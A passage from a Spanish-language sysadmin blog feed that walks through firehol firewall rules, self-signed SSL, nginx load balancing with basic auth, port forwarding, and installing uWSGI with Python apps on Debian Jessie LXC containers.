&lt;p&gt;Cuando nuestro servidor web recibe una petición, va a iniciar una nueva conexión contra el servidor de &lt;em&gt;backend&lt;/em&gt; que toque o el de &lt;em&gt;backoffice&lt;/em&gt;. Para habilitar esto, se necesitan nuevas reglas en el &lt;em&gt;firewall&lt;/em&gt;, que en este caso es &lt;strong&gt;firehol&lt;/strong&gt;, instalado en la máquina anfitriona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf
...  
&lt;span class="nv"&gt;app_servers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.3 10.0.0.4 10.0.0.5&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;frontend_server&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.2&amp;quot;&lt;/span&gt;
...
router internal inface lxc0 outface lxc0
...  
    route webcache accept src &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$frontend_server&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; dst &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$app_servers&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No os olvidéis de reiniciar &lt;strong&gt;firehol&lt;/strong&gt;, para que se apliquen las nuevas reglas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# service firehol restart
...  
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Montando los virtualhosts de ambas aplicaciones&lt;/h2&gt;
&lt;p&gt;La parte privada va a estar escondida tras una terminación &lt;strong&gt;HTTPS&lt;/strong&gt;. Esa aplicación se podría esconder tras una &lt;a href="http://www.linuxsysadmin.ml/2016/02/restringiendo-accesos-mediante-certificados-de-cliente.html"&gt;autenticación de certificados cliente&lt;/a&gt; o mediante &lt;a href="http://www.linuxsysadmin.ml/2016/02/restringiendo-accesos-web-mediante-autenticacion-basica.html"&gt;autenticación básica&lt;/a&gt;. Por simplicidad vamos a usar esta última.&lt;/p&gt;
&lt;p&gt;Empezamos generando un certificado autofirmado para el servidor web, directamente firmado, y su clave. Fijaos que no generamos ningún certificado de CA, ya que no tenemos ninguna intención de generar autenticación cliente en el futuro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# openssl req -new -newkey rsa:2048 -days &lt;span class="m"&gt;365&lt;/span&gt; -nodes -x509 -keyout server.key -out server.crt -subj &lt;span class="s2"&gt;&amp;quot;/C=ES/ST=Spain/L=Barcelona/O=LinuxSysadmin/CN=shop.linuxsysadmin.tk&amp;quot;&lt;/span&gt;
Generating a &lt;span class="m"&gt;2048&lt;/span&gt; bit RSA private key
.......................................+++
.................................................................................................................................................................+++
writing new private key to &lt;span class="s1"&gt;&amp;#39;server.key&amp;#39;&lt;/span&gt;
-----
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ponemos la clave y el certificado generado en sus respectivas localizaciones, de acuerdo a los estándares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# cp server.key /etc/ssl/private/
root@frontend:~# cp server.crt /etc/ssl/certs/
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como verificación, así quedaría la carpeta &lt;em&gt;/etc/ssl/&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# tree /etc/ssl/
/etc/ssl/
├── certs
│   └── server.crt
├── openssl.cnf
└── private
    └── server.key

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para poder autenticar mediante autenticación básica, generamos un usuario en un fichero tipo &lt;strong&gt;htpasswd&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin:&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;openssl passwd -crypt s3cr3t&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &amp;gt; /etc/nginx/shop.basic_auth
root@frontend:~# cat /etc/nginx/shop.basic_auth
admin:rOU9H0ABEB2H6
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con todas las piezas listas, montamos los virtualhosts, en un fichero de configuración o en varios, según nos apetezca.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# cat /etc/nginx/sites-enabled/shop
upstream backends &lt;span class="o"&gt;{&lt;/span&gt;
        server backend1:8080&lt;span class="p"&gt;;&lt;/span&gt;
        server backend2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
        listen &lt;span class="m"&gt;80&lt;/span&gt; default_server&lt;span class="p"&gt;;&lt;/span&gt;
        server_name _&lt;span class="p"&gt;;&lt;/span&gt;

        location / &lt;span class="o"&gt;{&lt;/span&gt;
                proxy_pass http://backends&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
        listen &lt;span class="m"&gt;443&lt;/span&gt; ssl&lt;span class="p"&gt;;&lt;/span&gt;
        server_name _&lt;span class="p"&gt;;&lt;/span&gt;

        ssl_certificate /etc/ssl/certs/server.crt&lt;span class="p"&gt;;&lt;/span&gt;
        ssl_certificate_key /etc/ssl/private/server.key&lt;span class="p"&gt;;&lt;/span&gt;

        auth_basic &lt;span class="s2"&gt;&amp;quot;Admin Area&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        auth_basic_user_file /etc/nginx/shop.basic_auth&lt;span class="p"&gt;;&lt;/span&gt;

        location / &lt;span class="o"&gt;{&lt;/span&gt;
                proxy_pass http://backoffice:8080&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración es bastante estándar; se trata de un &lt;em&gt;server&lt;/em&gt; (equivalente en &lt;strong&gt;nginx&lt;/strong&gt; a un &lt;em&gt;virtualhost&lt;/em&gt; de &lt;strong&gt;apache&lt;/strong&gt;) para cada protocolo. La parte de administración es solamente la mediación &lt;strong&gt;SSL&lt;/strong&gt; y un &lt;em&gt;proxy_pass&lt;/em&gt; hacia el &lt;em&gt;backoffice&lt;/em&gt;. La parte de la API pública también se limita a hacer un &lt;em&gt;proxy_pass&lt;/em&gt;, solo que se hace contra &lt;em&gt;backends&lt;/em&gt; que es un objeto &lt;strong&gt;upstream&lt;/strong&gt;, que es el que define el balanceador.&lt;/p&gt;
&lt;p&gt;Ahora solo queda reiniciar el servidor web para aplicar los cambios. De acuerdo a la documentación, habría bastado un &lt;em&gt;reload&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# service nginx restart
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobando que las aplicaciones funcionan&lt;/h2&gt;
&lt;p&gt;Para comprobar que la parte de la API funciona y balancea adecuadamente, basta con hacer peticiones. Podemos comprobar el &lt;em&gt;backend&lt;/em&gt; que la ha servido porque la aplicación pone una cabecera que especifica el nombre del &lt;em&gt;host&lt;/em&gt; que la resolvió. Con dos peticiones veremos que va alternativamente a cada &lt;em&gt;backend&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# curl -i http://localhost/products/
HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Server: nginx/1.6.2
Date: Fri, &lt;span class="m"&gt;26&lt;/span&gt; Feb &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:04:38 GMT
Content-Type: application/json
Content-Length: &lt;span class="m"&gt;3&lt;/span&gt;
Connection: keep-alive
Backend: backend1

&lt;span class="o"&gt;[]&lt;/span&gt;
root@frontend:~# curl -i http://localhost/products/
HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Server: nginx/1.6.2
Date: Fri, &lt;span class="m"&gt;26&lt;/span&gt; Feb &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:04:40 GMT
Content-Type: application/json
Content-Length: &lt;span class="m"&gt;3&lt;/span&gt;
Connection: keep-alive
Backend: backend2

&lt;span class="o"&gt;[]&lt;/span&gt;
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para la parte privada, haremos la petición, de la misma manera; vamos a añadir el flag &lt;em&gt;-k&lt;/em&gt; para sobrepasar el certificado autofirmado. Como no hemos indicado el usuario y la contraseña, nos devuelve un error 401, que indica que no estamos autorizados a pasar mas allá.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# curl -i -k https://localhost/products
HTTP/1.1 &lt;span class="m"&gt;401&lt;/span&gt; Unauthorized
Server: nginx/1.6.2
Date: Fri, &lt;span class="m"&gt;26&lt;/span&gt; Feb &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:05:35 GMT
Content-Type: text/html
Content-Length: &lt;span class="m"&gt;194&lt;/span&gt;
Connection: keep-alive
WWW-Authenticate: Basic &lt;span class="nv"&gt;realm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Admin Area&amp;quot;&lt;/span&gt;

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;401 Authorization Required&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body &lt;span class="nv"&gt;bgcolor&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;white&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;401 Authorization Required&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.6.2&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto parece que funciona, a falta de probar con un navegador adecuado.&lt;/p&gt;
&lt;h2&gt;Un pequeño detalle: abrimos los puertos&lt;/h2&gt;
&lt;p&gt;Puesto que este entorno está montado sobre virtualización &lt;strong&gt;LXC&lt;/strong&gt;, necesitamos que la dirección IP de la maquina anfitriona exponga los puertos de la máquina &lt;em&gt;frontend&lt;/em&gt;. Para ello hay que habilitar un mecanismo que se llama &lt;em&gt;port forwarding&lt;/em&gt;, coloquialmente conocido como "abrir el puerto".&lt;/p&gt;
&lt;p&gt;Mediante una directiva de &lt;strong&gt;firehol&lt;/strong&gt; indicamos que pasaremos todas las peticiones recibidas a los puertos 80 y 443 directamente a la máquina de &lt;em&gt;frontend&lt;/em&gt;. Hay que habilitar ese tráfico de &lt;strong&gt;FORWARD&lt;/strong&gt;, mediante otras reglas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf
...
&lt;span class="nv"&gt;frontend_server&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.2&amp;quot;&lt;/span&gt;
...
dnat to &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$frontend_server&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; proto tcp dport &lt;span class="m"&gt;80&lt;/span&gt;
dnat to &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$frontend_server&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; proto tcp dport &lt;span class="m"&gt;443&lt;/span&gt;
...
router world2lan inface eth0 outface lxc0
    route http accept dst &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$frontend_server&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    route https accept dst &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$frontend_server&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
...
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuevamente reiniciamos el servicio para aplicar las nuevas reglas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# service firehol restart
...
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Accediendo a las aplicaciones en la IP pública&lt;/h2&gt;
&lt;p&gt;Vamos a acceder con un navegador a la parte de administración, para ver que funciona y para rellenar algunos datos, para que se vea una respuesta de la API con fundamento.&lt;/p&gt;
&lt;p&gt;El primer paso consiste en abrir el navegador con la URL adecuada, y nos tropezamos con la autenticación.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Auth basic" src="http://www.linuxsysadmin.ml/images/entorno-escalable-auth-basic.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Tras pasar la autenticación podemos acceder a los formularios para añadir productos.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Admin form" src="http://www.linuxsysadmin.ml/images/entorno-escalable-admin-form.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Tras añadir tres productos, vemos que ya se genera la lista, en formato web.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Admin list" src="http://www.linuxsysadmin.ml/images/entorno-escalable-admin-list.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Con los datos introducidos podemos consumir la API, para comprobar que los datos que hemos introducido en la base de datos (mediante la aplicación de administración) están disponibles.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ wget -qO- http://192.168.1.232/products/
&lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;price&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;.5, 
        &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;123&amp;quot;&lt;/span&gt;, 
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Apples&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;, 
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;price&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;.0, 
        &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;456&amp;quot;&lt;/span&gt;, 
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Oranges&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;, 
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;price&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;2&lt;/span&gt;.0, 
        &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;789&amp;quot;&lt;/span&gt;, 
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Pears&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;]&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y consultando un producto concreto, también funciona como debe.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ wget -qO- http://192.168.1.232/products/456
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;price&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;.0, 
    &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;456&amp;quot;&lt;/span&gt;, 
    &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Oranges&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto comprobamos que todo queda en su sitio. Solo hará falta limpiar cualquier desecho que hayamos dejado en &lt;em&gt;/root/&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Y con este artículo cerramos la serie.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="proxy http"></category><category term="balanceador"></category><category term="ssl"></category><category term="nginx"></category><category term="virtual hosts"></category><category term="port forwarding"></category></entry><entry><title>Creando un entorno escalable (III)</title><link href="http://www.linuxsysadmin.ml/2016/03/creando-un-entorno-escalable-3.html" rel="alternate"></link><published>2016-03-14T08:00:00+01:00</published><updated>2016-03-14T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-03-14:/2016/03/creando-un-entorno-escalable-3.html</id><summary type="html">&lt;p&gt;En el artículo anterior de esta serie montamos el cluster de la base de datos que íbamos a necesitar para las aplicaciones que conformaban este entorno de ejemplo. Ahora que tenemos la base de datos, falta poner los servidores de aplicaciones que sirven nuestras aplicaciones y que usan el cluster …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En el artículo anterior de esta serie montamos el cluster de la base de datos que íbamos a necesitar para las aplicaciones que conformaban este entorno de ejemplo. Ahora que tenemos la base de datos, falta poner los servidores de aplicaciones que sirven nuestras aplicaciones y que usan el cluster.&lt;/p&gt;
&lt;p&gt;Las aplicaciones que pretendemos servir son aplicaciones hechas en &lt;strong&gt;python&lt;/strong&gt;, siguiendo el protocolo &lt;strong&gt;WSGI&lt;/strong&gt;. Para ir rápidos, ambas utilizan el &lt;em&gt;framework&lt;/em&gt; &lt;strong&gt;bottle&lt;/strong&gt;. En realidad, nos sirve cualquier &lt;em&gt;framework&lt;/em&gt; que construya aplicaciones &lt;strong&gt;WSGI&lt;/strong&gt; estándares, de acuerdo al protocolo. Estas aplicaciones se conectan a la base de datos antes creadas para resolver las peticiones, mediante el &lt;em&gt;driver&lt;/em&gt; de &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Desde el punto de vista de entrada al servidor, ambas aplicaciones se van a servir mediante el protocolo &lt;strong&gt;HTTP&lt;/strong&gt; en puerto TCP 8080. Hay muchos servidores que sirven aplicaciones &lt;strong&gt;WSGI&lt;/strong&gt;, por ejemplo, &lt;strong&gt;Apache mod_wsgi&lt;/strong&gt;, &lt;strong&gt;gunicorn&lt;/strong&gt; o &lt;strong&gt;uWSGI&lt;/strong&gt;. De hecho hay docenas de ellos, casi todos capaces de servir aplicaciones &lt;strong&gt;WSGI&lt;/strong&gt; en un puerto cualquiera TCP.&lt;/p&gt;
&lt;p&gt;En este caso, usaremos un servidor de aplicaciones &lt;strong&gt;uWSGI&lt;/strong&gt; que, aunque es un poco mas complicado que &lt;strong&gt;gunicorn&lt;/strong&gt; (y menos que &lt;strong&gt;mod_wsgi&lt;/strong&gt;), me tiene enamorado. Destaco especialmente el modo de funcionamiento &lt;em&gt;emperador&lt;/em&gt; y la capacidad de usar un &lt;em&gt;virtualenv&lt;/em&gt; distinto para cada aplicación servida. De hecho, puede servir diferentes lenguajes y/o versiones, una por cada aplicación.&lt;/p&gt;
&lt;h2&gt;Instalar el servidor de aplicaciones&lt;/h2&gt;
&lt;p&gt;Este paso se repite en las máquinas &lt;em&gt;backend1&lt;/em&gt;, &lt;em&gt;backend2&lt;/em&gt; y  &lt;em&gt;backoffice&lt;/em&gt;; aunque cada una va a servir una aplicación distinta, el servidor de aplicaciones es el mismo. En puntos posteriores pondremos y activaremos las aplicaciones.&lt;/p&gt;
&lt;p&gt;El servidor &lt;strong&gt;uWSGI&lt;/strong&gt; está disponible en los repositorios oficiales de &lt;em&gt;Debian Jessie&lt;/em&gt;. Vamos a instalarlo con un &lt;em&gt;init script&lt;/em&gt; que levante un emperador y le vamos a añadir el &lt;em&gt;plugin&lt;/em&gt; para servir &lt;strong&gt;python&lt;/strong&gt; (en la versión 2.7, según podemos ver).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# apt-get install uwsgi-emperor uwsgi-plugin-python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  file libexpat1 libffi6 libjansson4 libmagic1 libmatheval1 libpgm-5.1-0 libpython2.7 libpython2.7-minimal libpython2.7-stdlib
  libsodium13 libsqlite3-0 libxml2 libyaml-0-2 libzmq3 mime-support sgml-base uwsgi-core xml-core
Paquetes sugeridos:
  sgml-base-doc nginx-full cherokee libapache2-mod-proxy-uwsgi libapache2-mod-uwsgi libapache2-mod-ruwsgi uwsgi-plugins-all
  uwsgi-extra python-uwsgidecorators debhelper
Se instalarán los siguientes paquetes NUEVOS:
  file libexpat1 libffi6 libjansson4 libmagic1 libmatheval1 libpgm-5.1-0 libpython2.7 libpython2.7-minimal libpython2.7-stdlib
  libsodium13 libsqlite3-0 libxml2 libyaml-0-2 libzmq3 mime-support sgml-base uwsgi-core uwsgi-emperor uwsgi-plugin-python
  xml-core
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;21&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;6&lt;/span&gt;.608 kB de archivos.
Se utilizarán &lt;span class="m"&gt;25&lt;/span&gt;,9 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya tenemos el servidor de aplicaciones en funcionamiento. Las instancias se declaran con un fichero de configuración en &lt;em&gt;/etc/uwsgi-emperor/vassals/&lt;/em&gt;, que haremos mas adelante.&lt;/p&gt;
&lt;h2&gt;Consideraciones de seguridad&lt;/h2&gt;
&lt;p&gt;Estas aplicaciones usarán el &lt;em&gt;driver&lt;/em&gt; &lt;strong&gt;pymongo&lt;/strong&gt; para conectar a las instancias de &lt;strong&gt;mongodb&lt;/strong&gt;. Para eso hay que habilitar el tráfico relativo (de los servidores de aplicaciones a los de mongodb, por el puerto TCP 27017).&lt;/p&gt;
&lt;p&gt;En nuestro caso, como estamos trabajando con &lt;strong&gt;LXC&lt;/strong&gt;, lo haremos desde el &lt;em&gt;host&lt;/em&gt;, mediante la modificación de las reglas de &lt;em&gt;firehol&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf
&lt;span class="nv"&gt;mongo_servers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.5 10.0.0.6 10.0.0.7&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;app_servers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.3 10.0.0.4 10.0.0.5&amp;quot;&lt;/span&gt;
...  
router internal inface lxc0 outface lxc0
...  
      route custom mongodb tcp/27017 default accept src &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$app_servers&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; dst &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$mongo_servers&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
...  
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No os olvidéis de reiniciar el servicio &lt;em&gt;firehol&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando las aplicaciones&lt;/h2&gt;
&lt;p&gt;Este punto se hace en los tres servidores que sirven aplicaciones (&lt;em&gt;backend1&lt;/em&gt;, &lt;em&gt;backend2&lt;/em&gt; y &lt;em&gt;backoffice&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Las aplicaciones de ejemplo que vamos a usar las podéis encontrar en &lt;a href="http://www.linuxsysadmin.ml/downloads/shop.tar.gz"&gt;este enlace&lt;/a&gt;. Debo admitir que no son bonitas, pero para esta demostración, nos valen.&lt;/p&gt;
&lt;p&gt;Descomprimimos el fichero comprimido con las dos aplicaciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# tar xzf shop.tar.gz
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta es la estructura que queda tras descomprimir:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# tree
.
├── shop
│   ├── requirements.txt
│   ├── shop_admin
│   │   ├── app.py
│   │   └── views
│   │       ├── index.tpl
│   │       ├── product_form.tpl
│   │       └── product_list.tpl
│   └── shop_api
│       └── app.py
└── shop.tar.gz

&lt;span class="m"&gt;4&lt;/span&gt; directories, &lt;span class="m"&gt;7&lt;/span&gt; files
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta estructura tiene las dos aplicaciones. Cada tipo de servidor usará solo una por simplicidad, así que borraremos la que no se utilice, de acuerdo al tipo de servidor.&lt;/p&gt;
&lt;p&gt;En resumen, vamos a poner la carpeta &lt;em&gt;shop&lt;/em&gt; en &lt;em&gt;/opt/&lt;/em&gt;, y vamos a poner dentro el &lt;em&gt;virtualenv&lt;/em&gt; con las librerías necesarias.&lt;/p&gt;
&lt;p&gt;Como buena &lt;em&gt;praxis&lt;/em&gt;, vamos a instalar las librerías en un &lt;em&gt;virtualenv&lt;/em&gt; dedicado por aplicación. Para ello necesitamos la herramienta, que puede salir del repositorio oficial o lo podemos descargar, para usarlo y desecharlo posteriormente. Podemos encontrar el paquete en &lt;a href="https://pypi.python.org/packages/source/v/virtualenv/virtualenv-14.0.6.tar.gz#md5=a035037925c82990a7659ecf8764bcdb"&gt;este enlace&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Lo descomprimimos y lo dejamos ahí, para que los puntos específicos para cada servidor lo usen a su antojo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# tar xzf virtualenv-14.0.6.tar.gz
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; de creación del &lt;em&gt;virtualenv&lt;/em&gt; se ejecuta con &lt;strong&gt;python&lt;/strong&gt;; así que también lo necesitamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# apt-get install python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  libpython-stdlib python-minimal python2.7 python2.7-minimal
Paquetes sugeridos:
  python-doc python-tk python2.7-doc binutils binfmt-support
Se instalarán los siguientes paquetes NUEVOS:
  libpython-stdlib python python-minimal python2.7 python2.7-minimal
0 actualizados, 5 nuevos se instalarán, 0 para eliminar y 0 no actualizados.
Se necesita descargar 1.854 kB de archivos.
Se utilizarán 5.131 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? [S/n] s
..
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veamos ahora los puntos específicos por tipo de aplicación.&lt;/p&gt;
&lt;h3&gt;Aplicación de backend: la API pública&lt;/h3&gt;
